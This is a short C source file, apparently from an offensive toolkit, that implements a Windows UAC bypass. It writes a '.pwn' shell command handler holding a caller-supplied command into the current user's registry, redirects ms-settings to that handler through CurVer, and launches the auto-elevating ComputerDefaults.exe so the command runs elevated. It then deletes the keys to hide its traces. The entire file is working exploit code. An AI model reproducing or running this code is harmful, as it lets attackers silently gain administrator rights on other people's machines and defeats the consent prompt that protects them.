#include "ComputerDefaults.h"
int ComputerDefaults(char* arg)
 {

 PROCESS_INFORMATION pi = { 0 };
 STARTUPINFOA si = { 0 };
 HKEY hKey;
 HKEY hKey2;
 char* secret = arg;

 si.cb = sizeof(STARTUPINFO);
 si.wShowWindow = SW_HIDE;
 RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\.pwn\\Shell\\Open\\command", &hKey);
 RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)secret, strlen(secret));
 RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));

 RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\CurVer", &hKey2);
 RegSetValueExA(hKey2, "", 0, REG_SZ, (LPBYTE)".pwn", strlen(".pwn"));
 ShellExecuteA(NULL, "open", (LPCSTR)"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_SHOW);
 Sleep(1000);
 RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
 RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\.pwn");

 return 0;
}